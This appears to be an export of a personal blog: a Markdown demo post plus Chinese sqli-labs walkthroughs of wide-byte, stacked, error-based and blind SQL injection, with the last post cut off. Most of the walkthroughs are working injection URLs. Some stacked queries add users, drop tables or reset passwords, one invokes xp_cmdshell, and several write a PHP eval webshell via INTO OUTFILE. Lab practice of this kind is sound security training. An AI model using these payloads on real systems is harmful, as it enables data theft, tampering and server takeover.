[{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution  Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\n Blockquote with attribution  Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\n— Rob Pike1\n Tables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\n   Name Age     Bob 27   Alice 23    Inline Markdown within tables    Inline  Markdown  In  Table     italics bold strikethrough  code    Code Blocks Code block with backticks html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot; /\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  Code block indented with four spaces \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  List Types Ordered List  First item Second item Third item  Unordered List  List item Another item And another item  Nested list  Item   First Sub-item Second Sub-item  Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\n  The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015. \u0026#x21a9;\u0026#xfe0e;\n  ","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/markdown-syntax/","tags":["markdown","css","html","themes"],"title":"Markdown Syntax"},{"content":"前置知识 宽字节注入\n这里参考这位大佬的文章：点击\n在mysql中，用于转义（即在字符串中的符号前加上”\\”）的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将去除这个特性。\n涉及到的基本概念  字符、字符集 字符(character)是组成字符集(character set)的基本单位。对字符赋予一个数值(encoding)来确定这个字符在该字符集中的位置。 UTF8 由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF(Universal Transformation Format)。 宽字节 GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。  MYSQL的字符集转换过程 1.MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection;\n2.进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：\n 使用每个数据字段的CHARACTER SET设定值; 若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准); 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值; 若上述值不存在，则使用character_set_server设定值。  将操作结果从内部操作字符集转换为character_set_results。\n重点：宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。\n宽字节注入原理： GBK 占用两字节\nASCII占用一字节\nPHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\\”），MYSQL默认字符集是GBK等宽字节字符集。\n大家都知道%df' 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\\，变成了 %df\\'，其中\\的十六进制是 %5C ，那么现在 %df\\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\\' = %df%5c%27=縗'，而后面的单引号就逃逸出来了\n这里推荐一个解码网站：点击\nless-32 为了更好的理解SQL注入，我们在源代码中加上两行代码\necho $sql; echo \u0026quot;\u0026lt;br\u0026gt;\u0026quot;;  单引号尝试：\nhttp://localhost/sqli-labs-master/Less-32/?id=1'\n发现这里没有报错，在单引号的前面加上了\\进行转义\n这里我们看下源码\nfunction check_addslashes($string) { $string = preg_replace('/'. preg_quote('\\\\') .'/', \u0026quot;\\\\\\\\\\\\\u0026quot;, $string); //escape any backslash $string = preg_replace('/\\'/i', '\\\\\\'', $string); //escape single quote with a backslash $string = preg_replace('/\\\u0026quot;/', \u0026quot;\\\\\\\u0026quot;\u0026quot;, $string); //escape double quote with a backslash return $string; }  这里用到了addslashes函数进行转义\nmysql_query(\u0026quot;SET NAMES gbk\u0026quot;);  将字符集设置为gbk，可以进行宽字节注入。\ngbk中一个汉字占位两字节，所以可以用%df，与后边的反斜杠组成一个汉字，从而使单引号逃逸。\nhttp://localhost/sqli-labs-master/Less-32/?id=1%df'\n报错：\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1�\\'' LIMIT 0,1' at line 1\n注释掉后面：\nhttp://localhost/sqli-labs-master/Less-32/?id=1%df'--+\n查列：\nhttp://localhost/sqli-labs-master/Less-32/?id=1%df' order by 4--+\n报错： Unknown column '4' in 'order clause'\n说明只有三列\n找回显：\nhttp://localhost/sqli-labs-master/Less-32/?id=-1%df' union select 1,2,3--+\n这里按照以前的知识注入一下\n爆表名：\nhttp://localhost/sqli-labs-master/Less-32/?id=-1%df' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+\n我们这里发现我们的库名'security'由于使用了单引号，也同样被转义了，这里我们可以换成16进制，即：0x7365637572697479\nhttp://localhost/sqli-labs-master/Less-32/?id=-1%df' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+\n后面同理啦\n这里还有一种方法：\n就是 %aa%5c' 这里说一下过程 %aa %5c%5c %5c%27  这里 %5c 和 %27 都是 敏感字符，都会被转义 ，但是，实际过程是这样的%aa%5c %5c%5c %27\n解码后： 可以发现这里单引号摆脱了转义\n==其实两种方法都是两个字符组成一个汉字==\n后面的步骤和第一种方法是一样的\nless-33 function check_addslashes($string) { $string = preg_replace('/'. preg_quote('\\\\') .'/', \u0026quot;\\\\\\\\\\\\\u0026quot;, $string); //escape any backslash $string = preg_replace('/\\'/i', '\\\\\\'', $string); //escape single quote with a backslash $string = preg_replace('/\\\u0026quot;/', \u0026quot;\\\\\\\u0026quot;\u0026quot;, $string); //escape double quote with a backslash return $string; }  和上一关方法一样\nless-34 这一关我们又尝试宽字节注入，\n由于这关是POST传参，我们这里想的是应该是这样的：\nuname=a%df%27%#\u0026amp;passwd=111\u0026amp;submit=Submit\n应该是可以登录成功的，但是这里显示登录失败，我们抓个包看看\n我们可以看到这里：\n在我们想的基础在%af之间多了个%25 ，也就是对%进行了转义，难怪登录失败\n那后面就用burp做吧\n后面同理\n这里我们还能使用在UTF-8下的单引号，转换为UTF-16形式的单引号�'\n发生报错，说明我们可以在这里注入\n后面就和前面一样了\nless-35 这一关的和前面不同的是id的包裹形式不同\nmysql_query(\u0026quot;SET NAMES gbk\u0026quot;); $sql=\u0026quot;SELECT * FROM users WHERE id=$id LIMIT 0,1\u0026quot;;  这里id没有任何符号包裹\n爆回显位置：\nhttp://localhost/sqli-labs-master/Less-35/?id=-1 union select 1,2,3 --+ \n后面同理\n当然这关还可以用延时注入\n举个查数据库长度的例子： http://localhost/sqli-labs-master/Less-35/?id=-1 and if( length(database())\u0026gt;1,1,sleep(5) )\nless-36 此关使用的函数是check_quotes\nfunction check_quotes($string) { $string= mysql_real_escape_string($string); return $string; } // take the variables if(isset($_GET['id'])) { $id=check_quotes($_GET['id']);  那么这里就是肯定会转义单引号\nmysql_query(\u0026quot;SET NAMES gbk\u0026quot;);  这里依旧使用宽字节注入\nhttp://localhost/sqli-labs-master/Less-36/?id=1%df'\n报错：\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1�\\'' LIMIT 0,1' at line 1\n这里找回显：\nhttp://localhost/sqli-labs-master/Less-36/?id=-1%df' union select 1,2,3--+\n后面同上\nless-37 这关依旧使用mysql_real_escape_string函数进行转义，且传参方式为POST\nif(isset($_POST['uname']) \u0026amp;\u0026amp; isset($_POST['passwd'])) { $uname1=$_POST['uname']; $passwd1=$_POST['passwd']; //echo \u0026quot;username before addslashes is :\u0026quot;.$uname1 .\u0026quot;\u0026lt;br\u0026gt;\u0026quot;; //echo \u0026quot;Input password before addslashes is : \u0026quot;.$passwd1. \u0026quot;\u0026lt;br\u0026gt;\u0026quot;; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'User Name:'.$uname1); fwrite($fp,'Password:'.$passwd1.\u0026quot;\\n\u0026quot;); fclose($fp); $uname = mysql_real_escape_string($uname1); $passwd= mysql_real_escape_string($passwd1); //echo \u0026quot;username after addslashes is :\u0026quot;.$uname .\u0026quot;\u0026lt;br\u0026gt;\u0026quot;; //echo \u0026quot;Input password after addslashes is : \u0026quot;.$passwd; // connectivity mysql_query(\u0026quot;SET NAMES gbk\u0026quot;);  这里我们使用Burp抓包注入\n或者将UTF-8下的单引号 转为为UTF-16的 �'\n方法同34关\n","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/sqli-labs-less32-37%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/","tags":["Sqli-labs"],"title":"Sqli Labs Less 32-37 宽字节注入"},{"content":"前置知识 堆叠注入：\n这里引用这位大佬的博客：点击\n0x00 堆叠注入定义 Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。\n0x01 堆叠注入原理 在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where product id=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。\n0x02 堆叠注入的局限性 堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。\n此图是从原文中截取过来的，因为我个人的测试环境是php+mysql，是可以执行的，此处对于mysql/php存在质疑。但个人估计原文作者可能与我的版本的不同的原因。虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。\n0x03 各个数据库实例介绍 本节我们从常用数据库角度出发，介绍几个类型的数据库的相关用法。数据库的基本操作，增删查改。以下列出数据库相关堆叠注入的基本操作。\n1.Mysql （1）新建一表\nselect * from users where id=1;create table test like users;  执行成功，我们再去看一下是否新建成功表。\n（2）删除上面新建的test表\nselect * from users where id=1;drop table test;  （3）查询数据\nselect * from users where id=1;select 1,2,3;  （4）加载文件\nselect * from users where id=1;select load_file('c:/tmpupbbn.php');  (5) 修改数据\nselect * from users where id=1;insert into users(id,username,password) values ('100','new','new');  2. Sql server (1)增加数据表\nselect * from test;create table sc3(ss CHAR(8));  (2) 删除数据表\nselect * from test;drop table sc3;  (3)查询数据\nselect 1,2,3;select * from test;  (4)修改数据\nselect * from test;update test set name='test' where id=3;  (5)sqlserver中最为重要的存储过程的执行\nselect * from test where id=1;exec master..xp_cmdshell 'ipconfig'  3.Oracle 上面的介绍中我们已经提及，oracle不能使用堆叠注入，可以从图中看到，当有两条语句在同一行时，直接报错。无效字符。后面的就不往下继续尝试了。\n4.Postgresql (1)新建一个表\nselect * from user_test;create table user_data(id DATE);  可以看到user_data表已经建好。\n(2)删除上面新建的user_data表\nselect * from user_test;delete from user_data;  (3)查询数据\nselect * from user_test;select 1,2,3;  (4) 修改数据\nselect * from user_test;update user_test set name='modify' where name='张三';  less-38 这里我们使用堆叠注入创建一个表 shaw\nhttp://localhost/sqli-labs-master/Less-38/?id=1';create table shaw like users;--+\n这里执行成功\n这里表也成功创建\n然后我们再把这个表删掉\nhttp://localhost/sqli-labs-master/Less-38/?id=1';drop table shaw ;--+\n这里发现表被删除了\n当然这里也可以修改密码\nhttp://localhost/sqli-labs-master/Less-38/?id=1' ;update users set password='111' where username='Dumb';--+发现密码已经被修改了。\n这里看到，密码确实被改了\n这里记得重新配置一下数据库\nless-39 http://localhost/sqli-labs-master/Less-39/?id=1'根据报错就可以看出是数字型注入。\n操作和上关一样。这次我们来创建一个新用户吧. http://localhost/sqli-labs-master/Less-39/?id=1;insert into users values(111,'test','test');\n依旧记得重置数据库\nless-40 这关关闭了报错提示，但是我们依然可以根据页面的变化判断闭合方式。\nhttp://localhost/sqli-labs-master/Less-40/?id=1'，页面异常，说明包裹参数的有单引号，\n注释掉后面的，http://localhost/sqli-labs-master/Less-40/?id=1' --+,页面还没有正常回显，说明包裹参数的还有其他符号。\n再加一个括号，http://localhost/sqli-labs-master/Less-40/?id=1') --+,页面正常，说明闭合方式为单引号括号。')\n其他操作和前面两关一样。\nless-41 测试单引号双引号等都回显不正常，说明为数字型注入\n后面操作同上\nless-42 这关换了个页面：是个典型的登录注册改密码页面\n$username = mysqli_real_escape_string($con1, $_POST[\u0026quot;login_user\u0026quot;]); $password = $_POST[\u0026quot;login_password\u0026quot;]; $sql = \u0026quot;SELECT * FROM users WHERE username='$username' and password='$password'\u0026quot;;  可以看到用户名进行了转义，而密码处没有。\n在密码处进行万能密码登录，用户名随便输，密码处111' or 1 #\n发现登录成功，我们用户名上面有显示\n成功进入一个修改密码的页面。但是很遗憾不能进行注入了。\n$curr_pass= mysql_real_escape_string($_POST['current_password']); $pass= mysql_real_escape_string($_POST['password']); $re_pass= mysql_real_escape_string($_POST['re_password']);  在密码处输入111'，报错\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''111''' at line 1\n那么这关就可以用报错注入了\n111' and updatexml(1,concat(0x7e,substr((select group_concat(username,0x7e,password) from users),1,27),0x7e),1) #\n还可以从密码处堆叠注入,操作同上\npassword=111';insert into users values(711,'test','test'); #,成功创建用户。\n虽然这里显示的是失败页面，但是数据还是被我们加入了\n最后记得重置一下数据库\nless-43 尝试单引号，发现报错\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'')' at line 1\n得出闭合方式为 ')\n其余步骤同上\nless-44 发现本关关闭了报错，不能进行报错注入了。\n密码处尝试望能密码。111' or 1 #,成功登录，这也验证了闭合方式就是单引号。\n我们还可以进行堆叠注入。\n密码处输入：111';insert into users values(711,'test','test');#;用250用户登录，登陆成功\nless-45 发现本关也关闭了报错，不能进行报错注入了。\n继续尝试万能密码。\n111' or 1 #,并不能登入，可能闭合方式不是单引号，\n继续尝试111') or 1 #登入。\n进行堆叠注入，与前几关一样，只不过闭合方式改变了。\npayload: 111');insert into users values(711,'test','test');#\nless-46 在做这关之前我们又需要补充一些知识\n补充知识：\n  asc：指定列按升序排列\n  desc：指定列按降序排列\n  fields terminated by：各列的分割符号\n  lines terminated by：各行的分割符\n  我们在命令行中测试一下：\n这里我们随便写入个字符\nselect * from users into outfile 'E:\\\\phpstudy\\\\phpstudy_pro\\\\PHPTutorial\\\\WWW\\\\test.php' fields terminated by ',' lines terminated by 'shaw';\n文件确实被写入，并且用 , 和 shaw 分隔开\n这样的话其实就很危险了，我们可以写入一句话木马\nselect * from users into outfile 'E:\\\\phpstudy\\\\phpstudy_pro\\\\PHPTutorial\\\\WWW\\\\test.php' fields terminated by ',' lines terminated by '\u0026lt;?php @eval($_POST[\u0026quot;shaw\u0026quot;]);?\u0026gt;';\n当然这里使用十六进制也是可以的，即：\nselect * from users into outfile 'E:\\\\phpstudy\\\\phpstudy_pro\\\\PHPTutorial\\\\WWW\\\\test.php' fields terminated by ',' lines terminated by 0x3c3f70687020406576616c28245f504f53545b2273686177225d293b3f3e;\n回到题目：\n这个题的界面和之前的又不太一样\n应该是提示我们要使用sort\n这里我们先让 sort 等于 1 看下\n再尝试等于2\n我们这里发现 ID 的顺序乱了,我们猜出，sql为 select * from users order by $id\nhttp://localhost/sqli-labs-master/Less-46/?sort=1 desc输入desc或者asc可降序升序排列，说明可能存在注入。\nhttp://localhost/sqli-labs-master/Less-46/?sort=(select 1)成功以第一列进行排序。\nhttp://localhost/sqli-labs-master/Less-46/?sort=1'报错\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1，说明可以尝试报错注入。\nhttp://localhost/sqli-labs-master/Less-46/?sort=(select updatexml(1,concat(0x5e,database(),0x7e),1))成功爆出数据库名。\nhttp://localhost/sqli-labs-master/Less-46/?sort=1 and sleep(5)有延迟，说明可以时间注入。\npayload: http://localhost/sqli-labs-master/Less-46/?sort=(if(length(database())\u0026gt;1,1,sleep(5)))\n还可以将一句话写入，就像补充知识的那样。\n指定各列之间的分隔符为‘，’而行之间的分隔符为‘\\n’。\nselect * from users into outfile 'E:\\\\phpstudy\\\\phpstudy_pro\\\\PHPTutorial\\\\WWW\\\\test.php' fields terminated by ',' lines terminated by '\\n\u0026lt;?php eval($_POST[shaw]);?\u0026gt;';  当然也可以把一句话换成十六进制写入：\nselect * from users into outfile 'E:\\\\phpstudy\\\\phpstudy_pro\\\\PHPTutorial\\\\WWW\\\\test.php' fields terminated by ',' lines terminated by 0x3c3f70687020406576616c28245f504f53545b2273686177225d293b3f3e;\n写入后的效果上面有\nless-47 这里先试一下单引号'\n发现报错\n You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1\n由报错信息可知，闭合方式为 '\npayload:\nhttp://localhost/sqli-labs-master/Less-47/?sort=1' and updatexml(1,concat(0x5e,database(),0x7e),1) --+\nhttp://localhost/sqli-labs-master/Less-47/?sort=1' and if(length(database())\u0026gt;1,1,sleep(5)) --+\nhttp://localhost/sqli-labs-master/Less-47/?sort=1' into outfile 'E:\\\\phpstudy\\\\phpstudy_pro\\\\PHPTutorial\\\\WWW\\\\test.php' fields terminated by ',' lines terminated by 0x3c3f70687020406576616c28245f504f53545b2273686177225d293b3f3e;--+\nless-48 先尝试一下单引号\nhttp://localhost/sqli-labs-master/Less-48/?sort=1'\n发现没有报错信息，那么这关就无法使用报错注入了\n可用前面关卡的剩余方法\n这里\nhttp://localhost/sqli-labs-master/Less-47/?sort=1' and if(length(database())\u0026gt;1,1,sleep(5)) --+\n显示异常\nhttp://localhost/sqli-labs-master/Less-47/?sort=1 and if(length(database())\u0026gt;1,1,sleep(5)) \n显示正常\n说明是数字型注入\npayload:\nhttp://localhost/sqli-labs-master/Less-47/?sort=1 and if(length(database())\u0026gt;1,1,sleep(5)) \nhttp://localhost/sqli-labs-master/Less-47/?sort=1 into outfile 'E:\\\\phpstudy\\\\phpstudy_pro\\\\PHPTutorial\\\\WWW\\\\test.php' fields terminated by ',' lines terminated by 0x3c3f70687020406576616c28245f504f53545b2273686177225d293b3f3e;\nless-49 同样关闭了报错。\nhttp://localhost/sqli-labs-master/Less-49/?sort=1' --+回显正常。\n说明闭合方式单引号。\n可以使用除了报错的其他方法\npayload:\nhttp://localhost/sqli-labs-master/Less-47/?sort=1' and if(length(database())\u0026gt;1,1,sleep(5))--+ \nhttp://localhost/sqli-labs-master/Less-47/?sort=1' into outfile 'E:\\\\phpstudy\\\\phpstudy_pro\\\\PHPTutorial\\\\WWW\\\\test.php' fields terminated by ',' lines terminated by 0x3c3f70687020406576616c28245f504f53545b2273686177225d293b3f3e;--+\nless-50 这关用了函数mysqli_multi_query()\nmysql_query() 函数执行一条 MySQL 查询。\nmysqli_multi_query() 函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。\n这里很清楚的告诉我们可以进行堆叠注入。\nhttp://localhost/sqli-labs-master/Less-50/?sort=1;insert into users values(711,'test','test');  当然，由于我们一开始尝试单引号http://localhost/sqli-labs-master/Less-50/?sort=1'\n发生报错\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1\n所以也可以使用报错注入，并且为数字型注入\nhttp://localhost/sqli-labs-master/Less-50/?sort=1' and updatexml(1,concat(0x5e,database(),0x7e),1)\n当然其他的方法也是可以的\nless-51 http://localhost/sqli-labs-master/Less-51/?sort=1'报错信息得到单引号闭合。\n其余操作和前面都是一样的。\nless-52 这关输入单引号和双引号都没回显，关闭了报错，也得到时数字型注入。\n这关不能进行报错注入，但可以进行其他注入。跟前面一样。\nless-53 单引号页面回显异常，双引号正常。\nhttp://localhost/sqli-labs-master/Less-53/?sort=1' --+页面正常，说明闭合方式为单引号。\n也不能进行报错注入。可以用前几关方法进行注入。\n","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/sqli-labs-less38-53%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/","tags":["Sqli-labs"],"title":"Sqli Labs Less 38-53 堆叠注入"},{"content":"less-54 这一关只有十次机会，超过十次就会重置表名和密码\nhttp://localhost/sqli-labs-master/Less-54/?id=1  回显正常\nhttp://localhost/sqli-labs-master/Less-54/?id=1' 回显异常\nhttp://localhost/sqli-labs-master/Less-54/?id=1' --+回显正常。\n说明单引号闭合。\nhttp://localhost/sqli-labs-master/Less-54/?id=1' order by 2 --+ 回显正常\nhttp://localhost/sqli-labs-master/Less-54/?id=1' order by 3 --+ 回显正常\nhttp://localhost/sqli-labs-master/Less-54/?id=1' order by 4 --+ 回显异常\n说明有三个字段。\n找回显位置\nhttp://localhost/sqli-labs-master/Less-54/?id=-1' union select 1,2,3 --+回显正常\nhttp://localhost/sqli-labs-master/Less-54/?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 --+爆出表名。 n1lzaaugck\nhttp://localhost/sqli-labs-master/Less-54/?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='n1lzaaugck'),3--+\n爆出列名id,sessid,secret_K3RJ,tryy\nhttp://localhost/sqli-labs-master/Less-54/?id=-1' union select 1,(select group_concat(id,0x7e,sessid,0x7e,secret_K3RJ,0x7e,tryy) from n1lzaaugck),3 --+\n得到：1~1a7f33274089feff1baef7286b95fe0e~K9v8bg0CyvMigjxFQPHvRqIK~10\nless-55 这关有14次机会，让我们隐约感觉会比上一关难搞一点\n通过多次尝试才发现，闭合方式为 ) （其实试了很多次）\nhttp://localhost/sqli-labs-master/Less-55/id=1)--+\n后面步骤和上一关一样\nless-56 此关也是14次机会\n依旧是漫漫的尝试过程\n最终发现闭合方式为')\nhttp://localhost/sqli-labs-master/Less-56/?id=1') --+\n后面的步骤和前面关卡一样\nless-57 依旧为14次\n依旧漫长的尝试\u0026hellip;\n尝试出闭合方式为\u0026quot;\nhttp://localhost/sqli-labs-master/Less-57/?id=1\u0026quot; --+\nless-58 这关只有5次机会了\u0026hellip;\n感觉联合查询是不够了\u0026hellip;\n先试一下单引号吧\nhttp://localhost/sqli-labs-master/Less-58/?id=1'\n这里发现了报错信息，所以我们可以采用报错注入\n获取表名：\nhttp://localhost/sqli-labs-master/Less-58/?id=-1' and updatexml(1, concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e ),1)--+\n得到表名：q0042kuu1q\n获取列名：\nhttp://localhost/sqli-labs-master/Less-58/?id=-1' and updatexml(1, concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='q0042kuu1q'),0x7e),1)--+\n得到列名：id,sessid,secret_R6DV,tryy\n获取数据： http://localhost/sqli-labs-master/Less-58/?id=-1' and updatexml(1,concat(0x7e,(select secret_R6DV from q0042kuu1q),0x7e),1)--+\n得到数据55Ah1OMmu55rkk1GzUQqbszx\n最后，提交就好\nless-59 又是五次\nhttp://localhost/sqli-labs-master/Less-59/?id=1'判断为数字型注入。\n后面的和上一关一样啦\nless-60 经过尝试发现闭合方式为\u0026quot;)\n后面的步骤同上\nless-61 闭合方式为'))\n剩下的步骤和上面一样\nless-62 这关发现，居然有130次，130次！！！ 好吧，这是道盲注= =\n尝试http://localhost/sqli-labs-master/Less-62/?id=1' --+页面返回异常，说明包裹参数的有单引号。\nhttp://localhost/sqli-labs-master/Less-62/?id=1' --+页面还不正常，说明不只有单引号。\n加个括号，http://localhost/sqli-labs-master/Less-62/?id=1') --+页面返回正常，说明闭合方式为单引号括号')\n这关关闭了报错。同样union联合查询也不显示。\n尝试http://localhost/sqli-labs-master/Less-62/?id=1') and sleep(5)--+，页面延迟，，说明可以进行时间注入。\nhttp://localhost/sqli-labs-master/Less-62/??id=1') and if(length(database())\u0026gt;1,1,sleep(5))--+用二分法，\nhttp://localhost/sqli-labs-master/Less-62/?id=1') and if(length((select table_name from information_schema.tables where table_schema=database()))\u0026gt;1,1,sleep(5))--+\nhttp://localhost/sqli-labs-master/Less-62/?id=1') and if(ascii(substr((select table_name from information_schema.tables where table_schema=database()),1,1))\u0026gt;1,1,sleep(5))--+\n之后步骤只需将if()函数的第一个参数改一改就可以了。\nless-63 依旧130次\n单引号回显异常，\n加注释http://localhost/sqli-labs-master//Less-63/?id=1' --+,回显正常，说明闭合方式为单引号'\n后面操作同上\nless-64 还是130次\n尝试ing\n发现两括号闭合。\nhttp://localhost/sqli-labs-master/Less-64/?id=1)) --+页面回显正常验证了就是两括号的闭合方式。\n后面操作同上\nless-65 依旧130次\nhttp://localhost/sqli-labs-master/Less-65/?id=1\u0026quot;) --+页面回显正常，说明闭合方式为双引号括号\u0026quot;)\n后面操作同上\n完结撒花~\n","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/sqli-labs-less54-65/","tags":["Sqli-labs"],"title":"Sqli Labs Less 54-65"},{"content":"预备知识 基础mysql语句：\n查库：\nselect schema_name from information_schema.schemata;  查表：\nselect table_name from information_schema.tables where table_schema='security';  查字段：\nselect column_name from information_schema.columns where table_name='users';  查表：\nselect username,password from security.users;  辅助配置 找到sqli-labs-master 中 less-xx 中 index.php 添加以下代码 echo $sql; //将构造的Sql语句输出 echo \u0026quot;\u0026lt;br\u0026gt;\u0026quot;; //换行  来方便我们理解 sql 注入\n查字段：\nselect id,username,password from security.users;    在 MySQL 中，可使用 SHOW DATABASES;语句来查看或显示当前用户权限范围以内的数据库。==对大小写不敏感==\n  在MySQL中，可使用use database; 改变当前操作数据库\n  在MySQL中，可使用show tables;显示数据库这个表   select * from 表名称 //希望从 \u0026ldquo;xxxx\u0026rdquo; 表中选取所有的列。星号（*）是选取所有列的快捷方式。\n  SELECT * FROM users WHERE id='1' LIMIT 0,1;  //显示表中所有id=1的内容\n  limit 用法\n  由此可知：limit a,b a代表从第a+1个数据开始，b代表显示几个数据\n  order by a语句 //用与对列排序，a为列数 可用来判断表中有多少列\n  如果a大约列数，则报错\n    union select //联合查询，用来爆出显示位\n   union select 会把两条SQL 语句的查询结果拼接起来，形成一张虚拟的表。联合查询会实现跨库跨表查询，会极大减少SQL 注入的成本。  PS:\n联合查询有两个限制条件  两条SQL 语句的查询结果具有相同的列数 两条SQL 语句相同位置的列具有相同的数据类型   什么是显示位？\n在一个在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数 据展示在页面中，这个展示数据的位置就叫显示位，我们可以利用这个显示位显示我们想查询到的内容\n less-01 1、判断注入类型\n输入：?id=1'报错\n从'1'' LIMIT 0,1可以看出，为字符型注入。那么就可以通过注释我们添加上的 ' 后的内容执行查询。\n**PS：**从上述错误当中，我们可以看到提交到 sql 中的 1’在经过 sql 语句构造后形成 '1'' LIMIT 0,1，其本质是在查询的id参数两边使用单引号包裹，也就是'$id'这种情况，那么我们可以先加上一个单引号与前面的完成闭合，后面的单引号直接用–+或者#（需要编码为%23才能传参）注释掉，这样后面我们需要执行的SQL语句就能逃逸出来了\n2、猜解字段\n利用order by 